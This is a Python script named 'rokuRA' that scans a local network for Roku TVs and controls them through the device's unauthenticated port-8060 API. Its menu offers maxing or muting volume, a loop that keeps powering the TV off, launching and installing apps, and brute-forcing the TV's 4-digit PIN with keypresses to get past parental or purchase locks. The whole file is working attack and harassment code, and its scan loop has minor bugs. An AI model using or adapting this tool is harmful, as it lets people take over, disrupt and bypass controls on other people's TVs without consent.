#!/usr/bin/env python3
##############
# Roku Remote Access ('rokuRA')

# Double-line box drawing characters:
# Corners:
# ╔  ╗  ╚  ╝

# Horizontal and vertical lines:
# ═  (Double horizontal line)
# ║  (Double vertical line)

# Intersections:
# ╦  (Top intersection)
# ╩  (Bottom intersection)
# ╠  (Left intersection)
# ╣  (Right intersection)
# ╬  (Center intersection)

# Importing necessary libraries
import requests # For sending HTTP requests to the Roku device
import time # For adding delays
import subprocess
from tqdm import tqdm # For displaying progress bars
import os # For clearing the console
import platform # For checking the operating system

# Function to check if an app is already installed given the app ID. Returns a Boolean
def check_app_installed(ip, app_id):
    response = requests.get(f"http://{ip}:8060/query/apps")
    return f'<app id="{app_id}"' in response.text

# Function to send keypresses to the Roku TV given the key as a string
def send_keypress(ip, key):
    requests.post(f"http://{ip}:8060/keypress/{key}")

# Function for bruteforcing the 4-digit pin
def try_combinations(ip, app_id):

    for i in range(10000):
        combination = f"{i:04}"
        for digit in combination:
            send_keypress(ip, f"Lit_{digit}")

        send_keypress(ip, "Select")
        if check_app_installed(ip, app_id):
            return True
        
        send_keypress(ip, "Up")
    return False

# Function for installing an app given the app ID
def install_app(ip, app_id):

    # Attempts to install the app
    requests.post(f"http://{ip}:8060/install/{app_id}")

    if try_combinations(ip, app_id):
        print(f"App {app_id} successfully installed.")

        # Increases volume back up to 15
        for i in tqdm(range(15), desc="Adjusting Volume"):
            send_keypress(ip, "VolumeUp")

    else:
        print(f"Failed to install app {app_id}.")


# Function to clear the console
def clear_console():
    if platform.system() == "Windows":
        os.system("cls")
    else:
        os.system("clear")


# Function to draw the beautiful menu
def draw_menu():
    # Clear the console
    clear_console()

    print("""\033[35m
██████╗  ██████╗ ██╗  ██╗██╗   ██╗      ██████╗  █████╗ 
██╔══██╗██╔═══██╗██║ ██╔╝██║   ██║      ██╔══██╗██╔══██╗
██████╔╝██║   ██║█████╔╝ ██║   ██║█████╗██████╔╝███████║
██╔══██╗██║   ██║██╔═██╗ ██║   ██║╚════╝██╔══██╗██╔══██║
██║  ██║╚██████╔╝██║  ██╗╚██████╔╝      ██║  ██║██║  ██║
╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝ ╚═════╝       ╚═╝  ╚═╝╚═╝  ╚═╝""")
    print("\033[0m")
    print("\033[35m╔═════════>\033[0m Select an Option")
    print("\033[35m╠>\033[0m (1) Custom Input")
    print("\033[35m╠>\033[0m (2) Max out Volume")
    print("\033[35m╠>\033[0m (3) Minimize Volume")
    print("\033[35m╠>\033[0m (4) Custom Volume Change")
    print("\033[35m╠>\033[0m (5) Loop Shutdown")
    print("\033[35m╠>\033[0m (6) Launch App")
    print("\033[35m╠>\033[0m (7) Install an App")
    print("\033[35m╠>\033[0m (8) Automatic 4-digit Pin")
    print("\033[35m╠>\033[0m (9) Exit")
    print("\033[35m╚═════════\033[0m")

def select_option(ip):
    while True:

        # Display all options
        draw_menu()
        option = input("")
        
        if option == '1':
            # Ask for keystroke ID and send it
            keystroke = input("Enter the key ID: ")
            send_keypress(ip, keystroke)

        elif option == '2':
            # Adjust volume up by 100 (maximize it)
            for i in tqdm(range(100), desc="Adjusting Volume Up"):
                send_keypress(ip, "VolumeUp")

        elif option == '3':
            # Adjust volume down by 100 (minimize it)
            for i in tqdm(range(100), desc="Adjusting Volume Down"):
                send_keypress(ip, "VolumeDown")

        elif option == '4':
            # Get inputs for volume adjustment
            up_or_down = input("Increase or decrease volume? (1/2): ")
            amount = input("Enter the amount to adjust the volume by: ")

            if up_or_down == '1':
                for i in tqdm(range(int(amount)), desc="Adjusting Volume"):
                    send_keypress(ip, "VolumeUp")

            elif up_or_down == '2':
                for i in tqdm(range(int(amount)), desc="Adjusting Volume"):
                    send_keypress(ip, "VolumeDown")

        elif option == '5':
            # Loop to power off the TV
            print("Powering off the TV. Press Ctrl+C to exit.")
            while True:
                try:
                    send_keypress(ip, "PowerOff")
                    time.sleep(1)
                except KeyboardInterrupt:
                    break

        elif option == '6':
            # get app ID input and launch it
            app_id = input("Enter the app ID: ")
            requests.post(f"http://{ip}:8060/launch/{app_id}")
            print("Custom app launched!")

        elif option == '7':
            # get app ID input and install it
            app_id = input("Enter the app number: ")
            if check_app_installed(ip, app_id):
                print(f"App {app_id} is already installed")
            else:
                install_app(ip, app_id)
            
        elif option == '8':
            # try all possible combinations of the 4-digit pin
            # Must be manually cancelled
            for i in range(10000):
                combination = f"{i:04}"
                print(combination)
                for digit in combination:
                    send_keypress(ip, f"Lit_{digit}")

                send_keypress(ip, "Select")
                
                send_keypress(ip, "Up")

        elif option == '9':
            exit()
        else:
            print("Invalid option, please try again.")




#requests.post(f"http://{ip}:8060/launch/259656") --- launches an app


# The base IP address is set to ###.###.##.____ where the last 3 digits are missing
base_ip = ""

# Prompts for the ip address, and if it is empty it will attempt to automatically detect the ip address

def print_welcome():
    print("\033[0m")
    print("\033[35m╔═════════>\033[0m Welcome to rokuRA, Select an Option:")
    print("\033[35m╠>\033[0m (1) Input IP Manually")
    print("\033[35m╠>\033[0m (2) Auto detect IP")
    print("\033[35m╚═════════\033[0m")

print_welcome()
choice = input("")

if choice == '1':
    # Manual input
    ip = input("Enter the IP address of the Roku device: ")

elif choice == '2':
    # Begin automatic Detection
    base_ip = input("Enter the base IP (format: ###.###.##): ")
    timeout = input("\n Please input the delay between each scan, higher values will result in a slower scan but lower values may skip over the device: ")
    startingValue = input("Input the starting value for the scan (Scans from top down): ")
    # Iterate through the last octet (3 digits) from 255 to 0
    for i in range(int(startingValue), -1, -1):
        # Construct the full IP address
        ip = f"{base_ip}.{i}"
        url = f"http://{ip}:8060/query/device-info"

        if i == 0:
            print("No Roku device found.")
            exit()

        try:
            # Send a request to the Roku device info endpoint
            response = requests.get(url, timeout=float(timeout))  # Timeout set to 0.5 seconds to speed up the scan
            if response.status_code == 200:
                print(f"Possible Roku found at: {ip}")
                continue
        except requests.ConnectionError:
            # If the connection fails, just continue to the next IP
            print(f"Connection error, moving to next ip, {i}")
            continue
        except requests.Timeout:
            # If the request times out, continue to the next IP
            print("Timeout, moving to next ip, {i}")
            continue



print("Scan completed.")
select_option(ip)
